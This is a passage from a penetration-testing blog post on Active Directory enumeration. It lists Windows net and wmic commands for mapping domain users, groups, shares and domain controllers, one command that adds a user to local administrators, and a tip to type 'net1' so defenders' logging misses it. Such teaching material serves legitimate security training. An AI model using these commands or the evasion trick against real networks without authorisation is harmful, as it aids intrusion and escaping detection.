<td>Information about all local groups</td>
</tr>
<tr>
<td>wmic sysaccount list &#x2F;format:list</td>
<td>Dumps information about any system accounts that are being used as service accounts.</td>
</tr>
</tbody></table>
<p>This <a target="_blank" rel="noopener" href="https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4">cheatsheet</a> has some useful commands for querying host and domain info using wmic.</p>
<h3 id="Net-Commands"><a href="#Net-Commands" class="headerlink" title="Net Commands"></a>Net Commands</h3><p>Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>net accounts</td>
<td>Information about password requirements</td>
</tr>
<tr>
<td>net accounts &#x2F;domain</td>
<td>Password and lockout policy</td>
</tr>
<tr>
<td>net group &#x2F;domain</td>
<td>Information about domain groups</td>
</tr>
<tr>
<td>net group “Domain Admins” &#x2F;domain</td>
<td>List users with domain admin privileges</td>
</tr>
<tr>
<td>net group “domain computers” &#x2F;domain</td>
<td>List of PCs connected to the domain</td>
</tr>
<tr>
<td>net group “Domain Controllers” &#x2F;domain</td>
<td>List PC accounts of domains controllers</td>
</tr>
<tr>
<td>net group <domain_group_name> &#x2F;domain</td>
<td>User that belongs to the group</td>
</tr>
<tr>
<td>net groups &#x2F;domain</td>
<td>List of domain groups</td>
</tr>
<tr>
<td>net localgroup</td>
<td>All available groups</td>
</tr>
<tr>
<td>net localgroup administrators &#x2F;domain</td>
<td>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</td>
</tr>
<tr>
<td>net localgroup Administrators</td>
<td>Information about a group (admins)</td>
</tr>
<tr>
<td>net localgroup administrators [username] &#x2F;add</td>
<td>Add user to administrators</td>
</tr>
<tr>
<td>net share</td>
<td>Check current shares</td>
</tr>
<tr>
<td>net user <ACCOUNT_NAME> &#x2F;domain</td>
<td>Get information about a user within the domain</td>
</tr>
<tr>
<td>net user &#x2F;domain</td>
<td>List all users of the domain</td>
</tr>
<tr>
<td>net user %username%</td>
<td>Information about the current user</td>
</tr>
<tr>
<td>net use x: \computer\share</td>
<td>Mount the share locally</td>
</tr>
<tr>
<td>net view</td>
<td>Get a list of computers</td>
</tr>
<tr>
<td>net view &#x2F;all &#x2F;domain[:domainname]</td>
<td>Shares on the domains</td>
</tr>
<tr>
<td>net view \computer &#x2F;ALL</td>
<td>List shares of a computer</td>
</tr>
<tr>
<td>net view &#x2F;domain</td>
<td>List of PCs of the domain</td>
</tr>
</tbody></table>
<h2 id="Net-Command-Tip"><a href="#Net-Command-Tip" class="headerlink" title="Net Command Tip."></a>Net Command Tip.</h2><p>If you are in an environment where network defenders are actively logging&#x2F;looking for any commands out of the normal you can try typing <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>net1</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> instead of the <strong><strong><strong><strong>net</strong></strong></strong></strong> to work out using the net command.</p>
<h2 id="Dsquery"><a href="#Dsquery" class="headerlink" title="Dsquery"></a>Dsquery</h2><p>A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.</p>
<p><strong><strong>Dsquery</strong></strong> will exist on any host with the <code>Active Directory Domain Services Role</code> installed, and the <code>dsquery</code> DLL exists on all modern Windows systems by default now and can be found at <code>C:\Windows\System32\dsquery.dll</code></p>
<p>A long read but worthy to check up on those commands one might not remember …</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://malw0re.github.io/ouhboy">Malw0re</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://malw0re.github.io/ouhboy/2023/08/09/ad-credential-enumeration/">https://malw0re.github.io/ouhboy/2023/08/09/ad-credential-enumeration/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/ouhboy/tags/Active-Directory/">Active-Directory</a></div><div class="post-share"><div class="social-share" data-image="/ouhboy/images/darkbasin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/ouhboy/2023/07/13/kerberos-101/" title="Kerberos"><img class="cover" src="/ouhboy/images/kerb.webp" onerror="onerror=null;src='/ouhboy/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Kerberos</div></div><div class="info-2"><div class="info-item-1"> KerberoastingThe Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography. NB [kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network]  How Kerb Auth works!In every Active Directo...</div></div></div></a><a class="pagination-related" href="/ouhboy/2023/09/15/metasploit-1/" title="MSF CTF"><img class="cover" src="/ouhboy/images/msf.jpg" onerror="onerror=null;src='/ouhboy/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">MSF CTF</div></div><div class="info-2"><div class="info-item-1">Metasploit ctf I (easy)CTF Scenario: This lab is dedicated to you! No other users are on this network :) Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z. The lab has two target machines which should be located on the same subnet  i.e. 192.X.Y.0&#x2F;24 The target systems most of times, belong to “admin” or “root” user. Do not attack the gateway located at IP address 192.X.Y.1 You can use all tools installe...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/ouhboy/2024/01/04/acls/" title="ACL AD"><img class="cover" src="/ouhboy/images/access.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-04</div><div class="info-item-2">ACL AD</div></div><div class="info-2"><div class="info-item-1">Access Control List (ACL) Abuse PrimerFor security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it. Access Control List (ACL) OverviewIn their simplest form, ACLs are lists that define a) who has access to which asset...</div></div></div></a><a class="pagination-related" href="/ouhboy/2023/07/13/kerberos-101/" title="Kerberos"><img class="cover" src="/ouhboy/images/kerb.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-13</div><div class="info-item-2">Kerberos</div></div><div class="info-2"><div class="info-item-1"> KerberoastingThe Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography. NB [kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network]  How Kerb Auth works!In every Active Directo...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/ouhboy/images/cyber.png" onerror="this.onerror=null;this.src='/ouhboy/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Malw0re</div><div class="author-info-description"></div><div class="site-data"><a href="/ouhboy/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/ouhboy/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/ouhboy/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/malw0re/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/malw0re/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/brian-karanja-21331b164/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.x.com/M4LW0R3" target="_blank" title="twitter"><i class="fab fa-twitter" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my blog  where I post my writeups from Boxes & CTFs along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Credential Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CrackMapExec"><span class="toc-number">2.</span> <span class="toc-text">CrackMapExec.</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-UserEnum"><span class="toc-number">2.1.</span> <span class="toc-text">Domain UserEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Group-Enum"><span class="toc-number">2.2.</span> <span class="toc-text">Domain Group Enum</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smbmap"><span class="toc-number">3.</span> <span class="toc-text">Smbmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#recursive-list-Dirs-in-Shares"><span class="toc-number">3.1.</span> <span class="toc-text">recursive list Dirs in Shares</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RpcClient"><span class="toc-number">4.</span> <span class="toc-text">RpcClient</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.1.</span> <span class="toc-text">Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impacket-Toolkit"><span class="toc-number">5.</span> <span class="toc-text">Impacket-Toolkit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec-py"><span class="toc-number">5.1.</span> <span class="toc-text">Psexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windapsearch"><span class="toc-number">5.2.</span> <span class="toc-text">windapsearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Admins"><span class="toc-number">5.3.</span> <span class="toc-text">Domain-Admins</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privileged-Users"><span class="toc-number">5.4.</span> <span class="toc-text">Privileged Users</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BloodHound"><span class="toc-number">6.</span> <span class="toc-text">BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">6.1.</span> <span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveDirectory-Powershell-Modules"><span class="toc-number">7.</span> <span class="toc-text">ActiveDirectory Powershell Modules</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powerview"><span class="toc-number">8.</span> <span class="toc-text">Powerview</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#commands"><span class="toc-number">8.1.</span> <span class="toc-text">commands</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shares"><span class="toc-number">9.</span> <span class="toc-text">Shares</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Snaffler"><span class="toc-number">9.1.</span> <span class="toc-text">Snaffler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Living-off-the-Land"><span class="toc-number">10.</span> <span class="toc-text">Living off the Land</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Env-Enumeration-Host-Network-Recon"><span class="toc-number">10.1.</span> <span class="toc-text">Env Enumeration Host &amp; Network Recon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell"><span class="toc-number">11.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OPSec-Tactics"><span class="toc-number">12.</span> <span class="toc-text">OPSec Tactics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-number">12.1.</span> <span class="toc-text">Example</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Defenses"><span class="toc-number">12.2.</span> <span class="toc-text">Checking Defenses.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Am-I-Alone"><span class="toc-number">13.</span> <span class="toc-text">Am I Alone?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Enumeration"><span class="toc-number">13.1.</span> <span class="toc-text">Network Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Management-Instrumentation-WMI"><span class="toc-number">13.2.</span> <span class="toc-text">Windows Management Instrumentation (WMI)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-Commands"><span class="toc-number">13.3.</span> <span class="toc-text">Net Commands</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-Command-Tip"><span class="toc-number">14.</span> <span class="toc-text">Net Command Tip.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dsquery"><span class="toc-number">15.</span> <span class="toc-text">Dsquery</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2024/02/29/monitored/" title="Monitored"><img src="/ouhboy/images/monitored.jpeg" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="Monitored"/></a><div class="content"><a class="title" href="/ouhboy/2024/02/29/monitored/" title="Monitored">Monitored</a><time datetime="2024-02-29T08:30:03.000Z" title="Created 2024-02-29 11:30:03">2024-02-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2024/01/04/acls/" title="ACL AD"><img src="/ouhboy/images/access.jpg" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="ACL AD"/></a><div class="content"><a class="title" href="/ouhboy/2024/01/04/acls/" title="ACL AD">ACL AD</a><time datetime="2024-01-03T21:00:00.000Z" title="Created 2024-01-04 00:00:00">2024-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2023/11/29/stealth/" title="stealth"><img src="/ouhboy/images/stealth.jpg" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="stealth"/></a><div class="content"><a class="title" href="/ouhboy/2023/11/29/stealth/" title="stealth">stealth</a><time datetime="2023-11-29T08:30:03.000Z" title="Created 2023-11-29 11:30:03">2023-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2023/11/20/hospital-notes/" title="Hospital"><img src="/ouhboy/images/hosp.jpg" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="Hospital"/></a><div class="content"><a class="title" href="/ouhboy/2023/11/20/hospital-notes/" title="Hospital">Hospital</a><time datetime="2023-11-20T08:30:03.000Z" title="Created 2023-11-20 11:30:03">2023-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2023/10/23/forensics/" title="Hacktheboo 2023 CTF"><img src="/ouhboy/images/boo.png" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="Hacktheboo 2023 CTF"/></a><div class="content"><a class="title" href="/ouhboy/2023/10/23/forensics/" title="Hacktheboo 2023 CTF">Hacktheboo 2023 CTF</a><time datetime="2023-10-23T11:21:14.000Z" title="Created 2023-10-23 14:21:14">2023-10-23</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2020 - 2025 By Malw0re</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/ouhboy/js/utils.js?v=5.5.0"></script><script src="/ouhboy/js/main.js?v=5.5.0"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,ntsystem,sudo rm -rf,root,administrator,ctfs,sliver,cobalt strike,python,c#,malw0re,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>